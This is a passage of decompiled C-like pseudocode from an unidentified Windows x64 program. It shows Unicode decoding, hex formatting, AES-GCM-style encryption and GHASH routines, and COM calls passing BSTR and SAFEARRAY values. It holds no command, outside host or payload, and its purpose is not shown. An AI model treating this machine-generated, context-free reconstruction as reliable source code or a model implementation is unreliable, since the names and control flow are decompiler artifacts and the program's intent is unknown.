            auVar23._8_2_ = -(ushort)(auVar22._8_2_ == 0);
            auVar23._10_2_ = -(ushort)(auVar22._10_2_ == 0);
            auVar23._12_2_ = -(ushort)(auVar22._12_2_ == 0);
            auVar23._14_2_ = -(ushort)(auVar22._14_2_ == 0);
            if ((((((((((((((((SUB161(auVar23 >> 7,0) & 1) != 0 ||
                             (SUB161(auVar23 >> 0xf,0) & 1) != 0) ||
                            (SUB161(auVar23 >> 0x17,0) & 1) != 0) ||
                           (SUB161(auVar23 >> 0x1f,0) & 1) != 0) ||
                          (SUB161(auVar23 >> 0x27,0) & 1) != 0) ||
                         (SUB161(auVar23 >> 0x2f,0) & 1) != 0) ||
                        (SUB161(auVar23 >> 0x37,0) & 1) != 0) ||
                       (SUB161(auVar23 >> 0x3f,0) & 1) != 0) || (SUB161(auVar23 >> 0x47,0) & 1) != 0
                      ) || (SUB161(auVar23 >> 0x4f,0) & 1) != 0) ||
                    (SUB161(auVar23 >> 0x57,0) & 1) != 0) || (SUB161(auVar23 >> 0x5f,0) & 1) != 0)
                  || (SUB161(auVar23 >> 0x67,0) & 1) != 0) || (SUB161(auVar23 >> 0x6f,0) & 1) != 0)
                || (auVar23._14_2_ >> 7 & 1) != 0) || (auVar23._14_2_ & 0x8000) != 0) break;
            auVar22 = *pauVar15 & auVar10;
            sVar1 = auVar22._0_2_;
            sVar2 = auVar22._2_2_;
            sVar3 = auVar22._4_2_;
            sVar4 = auVar22._6_2_;
            sVar5 = auVar22._8_2_;
            sVar6 = auVar22._10_2_;
            sVar7 = auVar22._12_2_;
            sVar8 = auVar22._14_2_;
            *(ulonglong *)((longlong)local_1c8 + uVar19) =
                 CONCAT17((0 < sVar8) * (sVar8 < 0x100) * auVar22[0xe] - (0xff < sVar8),
                          CONCAT16((0 < sVar7) * (sVar7 < 0x100) * auVar22[0xc] - (0xff < sVar7),
                                   CONCAT15((0 < sVar6) * (sVar6 < 0x100) * auVar22[10] -
                                            (0xff < sVar6),
                                            CONCAT14((0 < sVar5) * (sVar5 < 0x100) * auVar22[8] -
                                                     (0xff < sVar5),
                                                     CONCAT13((0 < sVar4) * (sVar4 < 0x100) *
                                                              auVar22[6] - (0xff < sVar4),
                                                              CONCAT12((0 < sVar3) * (sVar3 < 0x100)
                                                                       * auVar22[4] - (0xff < sVar3)
                                                                       ,CONCAT11((0 < sVar2) *
                                                                                 (sVar2 < 0x100) *
                                                                                 auVar22[2] -
                                                                                 (0xff < sVar2),
                                                                                 (0 < sVar1) *
                                                                                 (sVar1 < 0x100) *
                                                                                 auVar22[0] -
                                                                                 (0xff < sVar1))))))
                                  ));
            uVar19 = uVar19 + 8;
            pauVar15 = pauVar15 + 1;
            uVar20 = uVar20 - 0x10;
          }
          if (uVar19 == uVar18) {
            pauVar15 = (undefined1 (*) [16])0x1;
          }
          uVar18 = 0;
          while (uVar18 != uVar20) {
            local_8c = *(ushort *)(*pauVar15 + uVar18);
            uVar16 = uVar18 + 2;
            param_2 = local_c0;
            param_1 = local_b8;
            puVar14 = local_b0;
            if ((local_8c & 0xfc00) == 0xd800) {
              if (uVar20 <= uVar16) goto LAB_14000830b;
              local_8a = *(undefined2 *)(*pauVar15 + uVar16);
              FUN_1400084f1((undefined8 *)&local_a0,&local_8c);
              param_2 = local_c0;
              puVar14 = local_b0;
              param_1 = local_b8;
              if (local_9c != 0) goto LAB_14000830b;
              uVar16 = uVar18 + 4;
              local_7c = local_a0;
              local_7a = local_9e & 0x1f;
              puVar17 = (uint3 *)&local_7c;
            }
            else {
              if ((local_8c & 0xfc00) == 0xdc00) goto LAB_14000830b;
              local_80 = local_8c;
              local_7e = 0;
              puVar17 = (uint3 *)&local_80;
            }
            FUN_1400083ed(&local_a4,(uint)*puVar17);
            uVar19 = uVar19 + local_a2;
            uVar18 = uVar16;
          }
          bVar12 = FUN_140006a0a((longlong)local_1c8,uVar19,local_c8,param_5);
          puVar14 = local_b0;
          param_1 = local_b8;
          param_2 = local_c0;
          if ((bVar12 & 1) != 0) {
            local_88 = 0;
            iVar13 = (*DAT_140034270)(local_b8,local_c0,local_b0[uVar21 + 2],10,&local_88);
            if (iVar13 != 0) {
              *param_6 = (ulonglong)local_88;
              LocalFree(hMem);
              uVar21 = CONCAT71((int7)((ulonglong)&local_a4 >> 8),1);
              goto LAB_140008328;
            }
          }
LAB_14000830b:
          LocalFree(hMem);
        }
      }
    }
    uVar21 = 0;
LAB_140008328:
    free(puVar14);
  }
  return uVar21 & 0xffffffff;
}


// ==== FUN_140008379 @ 140008379 size 32

longlong FUN_140008379(longlong param_1)

{
  FUN_1400084dc(param_1);
  return param_1;
}


// ==== FUN_140008399 @ 140008399 size 84

void FUN_140008399(undefined4 *param_1,uint param_2)

{
  undefined4 uVar1;
  uint uVar2;
  
  uVar2 = param_2 & 0x1fffff;
  uVar1 = DAT_14002d8a0;
  if ((((0x7f < uVar2) && (uVar1 = DAT_14002d8a4, 0x7ff < uVar2)) &&
      (uVar1 = DAT_14002d8a8, 0xffff < uVar2)) && (uVar1 = DAT_14002d8ac, 0x10ffff < uVar2)) {
    uVar1 = 0xd;
  }
  *param_1 = uVar1;
  return;
}


// ==== FUN_1400083ed @ 1400083ed size 97

short * FUN_1400083ed(short *param_1,uint param_2)

{
  undefined1 uVar1;
  short *psVar2;
  short local_2e;
  byte local_2c;
  
  uVar1 = FUN_140008399((undefined4 *)&local_2e,param_2);
  if (local_2e == 0) {
                    /* WARNING: Could not emulate address calculation at 0x00014000842b */
                    /* WARNING: Treating indirect jump as call */
    psVar2 = (short *)(*(code *)(&DAT_140017060 +
                                *(int *)(&DAT_140017060 + (ulonglong)(local_2c - 1) * 4)))
                                (&DAT_140017060 +
                                 *(int *)(&DAT_140017060 + (ulonglong)(local_2c - 1) * 4));
    return psVar2;
  }
  *param_1 = local_2e;
  *(undefined1 *)(param_1 + 1) = uVar1;
  *(undefined1 *)((longlong)param_1 + 3) = 0;
  return param_1;
}


// ==== FUN_1400084dc @ 1400084dc size 21

void FUN_1400084dc(longlong param_1)

{
  longlong lVar1;
  longlong lVar2;
  
  lVar2 = -1;
  do {
    lVar1 = lVar2 * 2;
    lVar2 = lVar2 + 1;
  } while (*(short *)(param_1 + 2 + lVar1) != 0);
  return;
}


// ==== FUN_1400084f1 @ 1400084f1 size 86

void FUN_1400084f1(undefined8 *param_1,ushort *param_2)

{
  ushort uVar1;
  ushort uVar2;
  int iVar3;
  
  uVar1 = param_2[1];
  if ((uVar1 & 0xfc00) == 0xdc00) {
    uVar2 = *param_2;
    *(undefined2 *)((longlong)param_1 + 4) = 0;
    iVar3 = (uVar1 & 0x3ff) + (uVar2 & 0x3ff) * 0x400 + 0x10000;
    *(short *)param_1 = (short)iVar3;
    *(char *)((longlong)param_1 + 2) = (char)((uint)iVar3 >> 0x10);
  }
  else {
    *param_1 = 0xa00000000;
  }
  return;
}


// ==== FUN_140008547 @ 140008547 size 47

void FUN_140008547(void)

{
  undefined4 *puVar1;
  
  puVar1 = calloc(1,0x828);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = 0x58;
    puVar1[0x14] = 2000;
  }
  return;
}


// ==== FUN_140008576 @ 140008576 size 22

void FUN_140008576(undefined8 *param_1,uint param_2)

{
  FUN_14000858c(param_1,(ulonglong)param_2,0,0x140017320);
  return;
}


// ==== FUN_14000858c @ 14000858c size 108

void FUN_14000858c(undefined8 *param_1,ulonglong param_2,byte param_3,longlong param_4)

{
  longlong lVar1;
  longlong lVar2;
  char cVar3;
  byte bVar4;
  bool bVar5;
  char cStack_19;
  
  lVar1 = 0;
  do {
    lVar2 = lVar1;
    bVar4 = (byte)param_2 & 0xf;
    cVar3 = bVar4 + 0x30;
    if (9 < bVar4) {
      cVar3 = bVar4 + (~param_3 & 1) * ' ' + '7';
    }
    (&cStack_19)[lVar2] = cVar3;
    bVar5 = 0xf < param_2;
    lVar1 = lVar2 + -1;
    param_2 = param_2 >> 4;
  } while (bVar5);
  FUN_1400055ea(param_1,(longlong)(&cStack_19 + lVar2),-(lVar2 + -1),param_4);
  return;
}


// ==== FUN_1400085f8 @ 1400085f8 size 23

void FUN_1400085f8(undefined8 *param_1,byte param_2)

{
  FUN_14000858c(param_1,(ulonglong)param_2,1,0x140019b30);
  return;
}


// ==== FUN_14000860f @ 14000860f size 23

void FUN_14000860f(undefined8 *param_1,ushort param_2)

{
  FUN_14000858c(param_1,(ulonglong)param_2,1,0x140019b08);
  return;
}


// ==== FUN_140008626 @ 140008626 size 22

void FUN_140008626(undefined8 *param_1,uint param_2)

{
  FUN_14000858c(param_1,(ulonglong)param_2,1,0x140019ae0);
  return;
}


// ==== FUN_14000863c @ 14000863c size 170

undefined8 *
FUN_14000863c(undefined8 *param_1,undefined8 param_2,undefined8 param_3,longlong *param_4)

{
  longlong lVar1;
  ulonglong uVar2;
  short sVar3;
  undefined **local_40;
  undefined8 local_38;
  undefined8 local_30;
  longlong local_28;
  
  local_40 = &PTR_FUN_140017348;
  local_28 = 0;
  lVar1 = param_4[2];
  uVar2 = param_4[3];
  local_38 = param_2;
  local_30 = param_3;
  sVar3 = FUN_1400055ea(&local_40,*param_4,param_4[1],0x140017320);
  if (((sVar3 == 0) && (sVar3 = FUN_1400055ea(&local_40,lVar1,uVar2,0x140017320), sVar3 == 0)) &&
     (sVar3 = FUN_14000541c(&local_40,0x1400194e0,1), sVar3 == 0)) {
    *(undefined2 *)(param_1 + 2) = 0;
    *param_1 = local_38;
    param_1[1] = local_28 + -1;
    return param_1;
  }
  *(undefined2 *)(param_1 + 2) = 3;
  return param_1;
}


// ==== FUN_1400086e6 @ 1400086e6 size 989

void FUN_1400086e6(uint *param_1,byte *param_2,byte *param_3,uint *param_4)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  byte bVar6;
  byte bVar7;
  byte bVar8;
  byte bVar9;
  byte bVar10;
  byte bVar11;
  byte bVar12;
  byte bVar13;
  byte bVar14;
  byte bVar15;
  uint local_2f8 [4];
  undefined8 local_2e8;
  undefined8 uStack_2e0;
  undefined8 local_2d8;
  undefined8 uStack_2d0;
  undefined8 local_2c8;
  undefined8 uStack_2c0;
  undefined8 local_2b8;
  undefined8 uStack_2b0;
  undefined8 local_2a8;
  undefined8 uStack_2a0;
  undefined8 local_298;
  undefined8 uStack_290;
  undefined8 local_288;
  undefined8 uStack_280;
  undefined8 local_278;
  undefined8 uStack_270;
  undefined8 local_268;
  undefined8 uStack_260;
  undefined8 local_258;
  undefined8 uStack_250;
  undefined8 local_248;
  undefined8 uStack_240;
  undefined8 local_238;
  undefined8 uStack_230;
  undefined8 local_228;
  undefined8 uStack_220;
  undefined8 local_218;
  undefined8 uStack_210;
  undefined8 local_208;
  undefined8 uStack_200;
  undefined8 local_1f8;
  undefined8 uStack_1f0;
  undefined8 local_1e8;
  undefined8 uStack_1e0;
  undefined8 local_1d8;
  undefined8 uStack_1d0;
  undefined8 local_1c8;
  undefined8 uStack_1c0;
  undefined8 local_1b8;
  undefined8 uStack_1b0;
  undefined8 local_1a8;
  undefined8 uStack_1a0;
  undefined8 local_198;
  undefined8 uStack_190;
  undefined8 local_188;
  undefined8 uStack_180;
  undefined8 local_178;
  undefined8 uStack_170;
  undefined8 local_168;
  undefined8 uStack_160;
  undefined8 local_158;
  undefined8 uStack_150;
  undefined8 local_148;
  undefined8 uStack_140;
  undefined8 local_138;
  undefined8 uStack_130;
  undefined8 local_128;
  undefined8 uStack_120;
  undefined8 local_118;
  undefined8 uStack_110;
  undefined8 local_108;
  undefined8 uStack_100;
  uint local_f8;
  uint uStack_f4;
  uint uStack_f0;
  uint uStack_ec;
  undefined8 local_e8;
  undefined8 uStack_e0;
  undefined8 local_d8;
  undefined8 uStack_d0;
  undefined8 local_c8;
  undefined8 uStack_c0;
  undefined8 local_b8;
  undefined8 uStack_b0;
  undefined8 local_a8;
  undefined8 uStack_a0;
  undefined8 local_98;
  undefined8 uStack_90;
  undefined8 local_88;
  undefined8 uStack_80;
  undefined8 local_78;
  undefined8 uStack_70;
  undefined8 local_68;
  undefined8 uStack_60;
  byte *local_50;
  
  local_108 = *(undefined8 *)(param_1 + 4);
  uStack_100 = *(undefined8 *)(param_1 + 6);
  local_138 = *(undefined8 *)(param_1 + 8);
  uStack_130 = *(undefined8 *)(param_1 + 10);
  local_168 = *(undefined8 *)(param_1 + 0xc);
  uStack_160 = *(undefined8 *)(param_1 + 0xe);
  local_198 = *(undefined8 *)(param_1 + 0x10);
  uStack_190 = *(undefined8 *)(param_1 + 0x12);
  local_1c8 = *(undefined8 *)(param_1 + 0x14);
  uStack_1c0 = *(undefined8 *)(param_1 + 0x16);
  local_68 = *(undefined8 *)(param_1 + 0x18);
  uStack_60 = *(undefined8 *)(param_1 + 0x1a);
  local_78 = *(undefined8 *)(param_1 + 0x1c);
  uStack_70 = *(undefined8 *)(param_1 + 0x1e);
  local_88 = *(undefined8 *)(param_1 + 0x20);
  uStack_80 = *(undefined8 *)(param_1 + 0x22);
  local_98 = *(undefined8 *)(param_1 + 0x24);
  uStack_90 = *(undefined8 *)(param_1 + 0x26);
  local_a8 = *(undefined8 *)(param_1 + 0x28);
  uStack_a0 = *(undefined8 *)(param_1 + 0x2a);
  local_b8 = *(undefined8 *)(param_1 + 0x2c);
  uStack_b0 = *(undefined8 *)(param_1 + 0x2e);
  local_c8 = *(undefined8 *)(param_1 + 0x30);
  uStack_c0 = *(undefined8 *)(param_1 + 0x32);
  local_d8 = *(undefined8 *)(param_1 + 0x34);
  uStack_d0 = *(undefined8 *)(param_1 + 0x36);
  local_e8 = *(undefined8 *)(param_1 + 0x38);
  uStack_e0 = *(undefined8 *)(param_1 + 0x3a);
  local_f8 = *param_4 ^ *param_1;
  uStack_f4 = param_4[1] ^ param_1[1];
  uStack_f0 = param_4[2] ^ param_1[2];
  uStack_ec = param_4[3] ^ param_1[3];
  local_50 = param_2;
  FUN_140005e9f((uint *)&local_118,&local_f8,(uint *)&local_108);
  local_128 = local_118;
  uStack_120 = uStack_110;
  FUN_140005e9f((uint *)&local_148,(undefined4 *)&local_128,(uint *)&local_138);
  local_158 = local_148;
  uStack_150 = uStack_140;
  FUN_140005e9f((uint *)&local_178,(undefined4 *)&local_158,(uint *)&local_168);
  local_188 = local_178;
  uStack_180 = uStack_170;
  FUN_140005e9f((uint *)&local_1a8,(undefined4 *)&local_188,(uint *)&local_198);
  local_1b8 = local_1a8;
  uStack_1b0 = uStack_1a0;
  FUN_140005cd5((uint *)&local_1d8,(uint *)&local_1b8,(uint *)&local_1c8);
  local_1e8 = local_1d8;
  uStack_1e0 = uStack_1d0;
  FUN_140005cd5((uint *)&local_1f8,(uint *)&local_1e8,(uint *)&local_68);
  local_208 = local_1f8;
  uStack_200 = uStack_1f0;
  FUN_140005cd5((uint *)&local_218,(uint *)&local_208,(uint *)&local_78);
  local_228 = local_218;
  uStack_220 = uStack_210;
  FUN_140005cd5((uint *)&local_238,(uint *)&local_228,(uint *)&local_88);
  local_248 = local_238;
  uStack_240 = uStack_230;
  FUN_140005cd5((uint *)&local_258,(uint *)&local_248,(uint *)&local_98);
  local_268 = local_258;
  uStack_260 = uStack_250;
  FUN_140005cd5((uint *)&local_278,(uint *)&local_268,(uint *)&local_a8);
  local_288 = local_278;
  uStack_280 = uStack_270;
  FUN_140005cd5((uint *)&local_298,(uint *)&local_288,(uint *)&local_b8);
  local_2a8 = local_298;
  uStack_2a0 = uStack_290;
  FUN_140005cd5((uint *)&local_2b8,(uint *)&local_2a8,(uint *)&local_c8);
  local_2c8 = local_2b8;
  uStack_2c0 = uStack_2b0;
  FUN_140005e9f((uint *)&local_2d8,(undefined4 *)&local_2c8,(uint *)&local_d8);
  local_2e8 = local_2d8;
  uStack_2e0 = uStack_2d0;
  FUN_140005b71(local_2f8,(undefined4 *)&local_2e8,(uint *)&local_e8);
  bVar1 = param_3[4];
  bVar2 = param_3[8];
  bVar3 = param_3[0xc];
  bVar4 = param_3[1];
  bVar5 = param_3[2];
  bVar6 = param_3[3];
  bVar7 = param_3[5];
  bVar8 = param_3[6];
  bVar9 = param_3[7];
  bVar10 = param_3[9];
  bVar11 = param_3[10];
  bVar12 = param_3[0xb];
  bVar13 = param_3[0xd];
  bVar14 = param_3[0xe];
  bVar15 = param_3[0xf];
  *local_50 = *param_3 ^ (byte)local_2f8[0];
  local_50[1] = (byte)(local_2f8[0] >> 8) ^ bVar4;
  local_50[2] = (byte)(local_2f8[0] >> 0x10) ^ bVar5;
  local_50[3] = (byte)(local_2f8[0] >> 0x18) ^ bVar6;
  local_50[4] = bVar1 ^ (byte)local_2f8[1];
  local_50[5] = (byte)(local_2f8[1] >> 8) ^ bVar7;
  local_50[6] = (byte)(local_2f8[1] >> 0x10) ^ bVar8;
  local_50[7] = (byte)(local_2f8[1] >> 0x18) ^ bVar9;
  local_50[8] = bVar2 ^ (byte)local_2f8[2];
  local_50[9] = (byte)(local_2f8[2] >> 8) ^ bVar10;
  local_50[10] = (byte)(local_2f8[2] >> 0x10) ^ bVar11;
  local_50[0xb] = (byte)(local_2f8[2] >> 0x18) ^ bVar12;
  local_50[0xc] = bVar3 ^ (byte)local_2f8[3];
  local_50[0xd] = (byte)(local_2f8[3] >> 8) ^ bVar13;
  local_50[0xe] = (byte)(local_2f8[3] >> 0x10) ^ bVar14;
  local_50[0xf] = (byte)(local_2f8[3] >> 0x18) ^ bVar15;
  return;
}


// ==== FUN_140008ac3 @ 140008ac3 size 67

void FUN_140008ac3(undefined8 *param_1)

{
  ulonglong uVar1;
  
  uVar1 = param_1[8];
  if (uVar1 != 0) {
    for (; uVar1 < 0x10; uVar1 = uVar1 + 1) {
      *(undefined1 *)((longlong)param_1 + uVar1 + 0x30) = 0;
    }
    FUN_140008b06(param_1,(longlong)(param_1 + 6),0x10);
    param_1[8] = 0;
  }
  return;
}


// ==== FUN_140008b06 @ 140008b06 size 411

void FUN_140008b06(undefined8 *param_1,longlong param_2,ulonglong param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  undefined8 *puVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  ulonglong local_138 [6];
  ulonglong local_108;
  ulonglong local_100;
  ulonglong local_f8;
  ulonglong local_f0;
  ulonglong local_e8;
  ulonglong local_e0;
  ulonglong local_d8;
  ulonglong local_d0;
  ulonglong local_c8;
  ulonglong local_c0;
  ulonglong local_b8;
  ulonglong local_b0;
  ulonglong local_a8;
  ulonglong local_a0;
  ulonglong local_98;
  ulonglong local_90;
  ulonglong local_88;
  ulonglong local_80;
  ulonglong local_70;
  ulonglong local_68;
  ulonglong local_60;
  ulonglong local_58;
  longlong local_50;
  undefined8 *local_48;
  
  uVar6 = param_1[4];
  uVar7 = param_1[5];
  uVar8 = 0;
  local_58 = param_3;
  local_50 = param_2;
  local_48 = param_1;
  while (puVar5 = local_48, uVar8 + 0x20 <= local_58) {
    uVar1 = *(ulonglong *)(param_2 + uVar8);
    uVar2 = *(ulonglong *)(param_2 + 8 + uVar8);
    local_70 = uVar8 + 0x20;
    FUN_140008e99(&local_a8,
                  (uVar2 >> 0x38 | (uVar2 & 0xff000000000000) >> 0x28 |
                   (uVar2 & 0xff0000000000) >> 0x18 | (uVar2 & 0xff00000000) >> 8 |
                   (uVar2 & 0xff000000) << 8 | (uVar2 & 0xff0000) << 0x18 | (uVar2 & 0xff00) << 0x28
                  | uVar2 << 0x38) ^ uVar6,
                  (uVar1 >> 0x38 | (uVar1 & 0xff000000000000) >> 0x28 |
                   (uVar1 & 0xff0000000000) >> 0x18 | (uVar1 & 0xff00000000) >> 8 |
                   (uVar1 & 0xff000000) << 8 | (uVar1 & 0xff0000) << 0x18 | (uVar1 & 0xff00) << 0x28
                  | uVar1 << 0x38) ^ uVar7,param_1[2],param_1[3]);
    uVar4 = local_80;
    uVar3 = local_90;
    uVar2 = local_98;
    uVar1 = local_a0;
    local_60 = local_a8;
    local_68 = local_88;
    uVar6 = *(ulonglong *)(param_2 + 0x10 + uVar8);
    uVar7 = *(ulonglong *)(param_2 + 0x18 + uVar8);
    uVar7 = uVar7 >> 0x38 | (uVar7 & 0xff000000000000) >> 0x28 | (uVar7 & 0xff0000000000) >> 0x18 |
            (uVar7 & 0xff00000000) >> 8 | (uVar7 & 0xff000000) << 8 | (uVar7 & 0xff0000) << 0x18 |
            (uVar7 & 0xff00) << 0x28 | uVar7 << 0x38;
    FUN_140008e99(&local_d8,uVar7,
                  uVar6 >> 0x38 | (uVar6 & 0xff000000000000) >> 0x28 |
                  (uVar6 & 0xff0000000000) >> 0x18 | (uVar6 & 0xff00000000) >> 8 |
                  (uVar6 & 0xff000000) << 8 | (uVar6 & 0xff0000) << 0x18 | (uVar6 & 0xff00) << 0x28
                  | uVar6 << 0x38,*param_1,param_1[1]);
    local_108 = local_60 ^ local_d8;
    local_100 = uVar1 ^ local_d0;
    local_f8 = uVar2 ^ local_c8;
    local_f0 = uVar3 ^ local_c0;
    local_e8 = local_68 ^ local_b8;
    local_e0 = uVar4 ^ local_b0;
    uVar6 = FUN_140008ca1(&local_108);
    uVar8 = local_70;
  }
  if (uVar8 < local_58) {
    uVar1 = *(ulonglong *)(local_50 + uVar8);
    uVar8 = *(ulonglong *)(local_50 + 8 + uVar8);
    uVar8 = (uVar8 >> 0x38 | (uVar8 & 0xff000000000000) >> 0x28 | (uVar8 & 0xff0000000000) >> 0x18 |
             (uVar8 & 0xff00000000) >> 8 | (uVar8 & 0xff000000) << 8 | (uVar8 & 0xff0000) << 0x18 |
             (uVar8 & 0xff00) << 0x28 | uVar8 << 0x38) ^ uVar6;
    FUN_140008e99(local_138,uVar8,
                  (uVar1 >> 0x38 | (uVar1 & 0xff000000000000) >> 0x28 |
                   (uVar1 & 0xff0000000000) >> 0x18 | (uVar1 & 0xff00000000) >> 8 |
                   (uVar1 & 0xff000000) << 8 | (uVar1 & 0xff0000) << 0x18 | (uVar1 & 0xff00) << 0x28
                  | uVar1 << 0x38) ^ uVar7,*local_48,local_48[1]);
    uVar6 = FUN_140008ca1(local_138);
    uVar7 = uVar8;
  }
  puVar5[4] = uVar6;
  puVar5[5] = uVar7;
  return;
}


// ==== FUN_140008ca1 @ 140008ca1 size 115

ulonglong FUN_140008ca1(ulonglong *param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  
  uVar5 = param_1[2];
  uVar1 = param_1[5];
  uVar6 = param_1[4] ^ param_1[3];
  uVar2 = *param_1;
  uVar4 = uVar6;
  uVar3 = FUN_140008d14(uVar5,uVar6,0xc200000000000000);
  uVar5 = uVar5 ^ uVar4;
  uVar4 = FUN_140008d14(uVar6 ^ uVar3,uVar5,0xc200000000000000);
  return uVar4 ^ uVar5 ^ uVar1 ^ uVar2;
}


// ==== FUN_140008d14 @ 140008d14 size 118

ulonglong FUN_140008d14(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  uint uVar4;
  uint uVar5;
  
  uVar1 = FUN_140008d8a((uint)param_1,(uint)param_3);
  uVar4 = (uint)((ulonglong)param_1 >> 0x20);
  uVar5 = (uint)((ulonglong)param_3 >> 0x20);
  uVar2 = FUN_140008d8a(uVar4,uVar5);
  uVar3 = FUN_140008d8a(uVar4 ^ (uint)param_1,uVar5 ^ (uint)param_3);
  return (uVar1 ^ uVar2 ^ uVar3) << 0x20 ^ uVar1;
}


// ==== FUN_140008d8a @ 140008d8a size 271

ulonglong FUN_140008d8a(uint param_1,uint param_2)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  
  uVar7 = (ulonglong)(param_1 & 0x11111111);
  uVar3 = (ulonglong)(param_1 & 0x22222222);
  uVar8 = (ulonglong)(param_1 & 0x44444444);
  uVar2 = (ulonglong)(param_1 & 0x88888888);
  uVar5 = (ulonglong)(param_2 & 0x11111111);
  uVar1 = (ulonglong)(param_2 & 0x22222222);
  uVar6 = (ulonglong)(param_2 & 0x44444444);
  uVar4 = (ulonglong)(param_2 & 0x88888888);
  return (uVar5 * uVar2 ^ uVar1 * uVar8 ^ uVar6 * uVar3 ^ uVar4 * uVar7) & 0x888888888888888 |
         (uVar4 * uVar2 ^ uVar5 * uVar8 ^ uVar1 * uVar3 ^ uVar6 * uVar7) & 0x4444444444444444 |
         (uVar6 * uVar2 ^ uVar4 * uVar8 ^ uVar5 * uVar3 ^ uVar1 * uVar7) & 0x2222222222222222 |
         (uVar1 * uVar2 ^ uVar6 * uVar8 ^ uVar4 * uVar3 ^ uVar5 * uVar7) & 0x1111111111111111;
}


// ==== FUN_140008e99 @ 140008e99 size 160

ulonglong *
FUN_140008e99(ulonglong *param_1,undefined8 param_2,ulonglong param_3,undefined8 param_4,
             ulonglong param_5)

{
  ulonglong uVar1;
  ulonglong uVar2;
  
  uVar2 = param_3;
  uVar1 = FUN_14000907a(param_2,param_3,param_4,param_5);
  param_1[1] = uVar2;
  *param_1 = uVar1;
  uVar2 = param_3;
  uVar1 = FUN_140008d14(param_2,param_3,param_4);
  param_1[3] = uVar2;
  param_1[2] = uVar1;
  uVar2 = FUN_140009002(param_2,param_3,param_4);
  uVar1 = FUN_140009002(param_4,param_5,param_2);
  param_1[5] = param_5 ^ param_3;
  param_1[4] = uVar1 ^ uVar2;
  return param_1;
}


// ==== FUN_140008f39 @ 140008f39 size 201

void FUN_140008f39(undefined8 *param_1,longlong param_2,ulonglong param_3)

{
  longlong lVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  
  if (param_1[8] != 0) {
    uVar2 = 0x10 - param_1[8];
    if (param_3 <= uVar2) {
      uVar2 = param_3;
    }
    for (uVar3 = 0; uVar2 != uVar3; uVar3 = uVar3 + 1) {
      *(undefined1 *)((longlong)param_1 + uVar3 + 0x30 + param_1[8]) =
           *(undefined1 *)(param_2 + uVar3);
    }
    lVar1 = param_1[8];
    param_1[8] = lVar1 + uVar2;
    if (lVar1 + uVar2 < 0x10) {
      return;
    }
    param_3 = param_3 - uVar2;
    param_2 = param_2 + uVar2;
    FUN_140008b06(param_1,(longlong)(param_1 + 6),0x10);
    param_1[8] = 0;
  }
  if (0xf < param_3) {
    FUN_140008b06(param_1,param_2,param_3 & 0xfffffffffffffff0);
    param_2 = param_2 + (param_3 & 0xfffffffffffffff0);
    param_3 = (ulonglong)((uint)param_3 & 0xf);
  }
  if (param_3 != 0) {
    for (uVar2 = 0; param_3 != uVar2; uVar2 = uVar2 + 1) {
      *(undefined1 *)((longlong)param_1 + uVar2 + param_1[8] + 0x30) =
           *(undefined1 *)(param_2 + uVar2);
    }
    param_1[8] = param_1[8] + param_3;
  }
  return;
}


// ==== FUN_140009002 @ 140009002 size 120

ulonglong FUN_140009002(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  uint uVar4;
  uint uVar5;
  
  uVar1 = FUN_140008d8a((uint)param_2,(uint)param_3);
  uVar4 = (uint)((ulonglong)param_2 >> 0x20);
  uVar5 = (uint)((ulonglong)param_3 >> 0x20);
  uVar2 = FUN_140008d8a(uVar4,uVar5);
  uVar3 = FUN_140008d8a(uVar4 ^ (uint)param_2,uVar5 ^ (uint)param_3);
  return (uVar1 ^ uVar2 ^ uVar3) << 0x20 ^ uVar1;
}


// ==== FUN_14000907a @ 14000907a size 120

ulonglong FUN_14000907a(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  uint uVar4;
  uint uVar5;
  
  uVar1 = FUN_140008d8a((uint)param_2,(uint)param_4);
  uVar4 = (uint)((ulonglong)param_2 >> 0x20);
  uVar5 = (uint)((ulonglong)param_4 >> 0x20);
  uVar2 = FUN_140008d8a(uVar4,uVar5);
  uVar3 = FUN_140008d8a(uVar4 ^ (uint)param_2,uVar5 ^ (uint)param_4);
  return (uVar1 ^ uVar2 ^ uVar3) << 0x20 ^ uVar1;
}


// ==== FUN_1400090f2 @ 1400090f2 size 18

void FUN_1400090f2(byte param_1)

{
                    /* WARNING: Subroutine does not return */
  exit((uint)param_1);
}


// ==== FUN_140009105 @ 140009105 size 98

void FUN_140009105(longlong *param_1,undefined8 param_2,undefined1 (*param_3) [16],ulonglong param_4
                  ,undefined8 param_5)

{
  BSTR bstrString;
  undefined8 local_30;
  undefined8 local_28;
  
  bstrString = FUN_14000921a(param_3,param_4);
  if (bstrString != (BSTR)0x0) {
    local_30 = 0x2008;
    local_28 = param_5;
    (**(code **)(*param_1 + 0x28))(param_2,bstrString,0,&local_30,0x2008);
    SysFreeString(bstrString);
  }
  return;
}


// ==== FUN_140009167 @ 140009167 size 179

SAFEARRAY * FUN_140009167(longlong param_1,longlong param_2)

{
  SAFEARRAY *psa;
  OLECHAR *psz;
  BSTR bstrString;
  ulonglong uVar1;
  ulonglong *puVar2;
  longlong lVar3;
  LONG local_44;
  
  psa = SafeArrayCreateVector(8,0,(ULONG)param_2);
  if (psa == (SAFEARRAY *)0x0) {
LAB_140009204:
    psa = (SAFEARRAY *)0x0;
  }
  else {
    puVar2 = (ulonglong *)(param_1 + 8);
    for (lVar3 = 0; param_2 != lVar3; lVar3 = lVar3 + 1) {
      uVar1 = *puVar2;
      psz = (OLECHAR *)FUN_140009294((undefined1 (*) [16])puVar2[-1],uVar1);
      if (psz == (OLECHAR *)0x0) {
        SafeArrayDestroy(psa);
        goto LAB_140009204;
      }
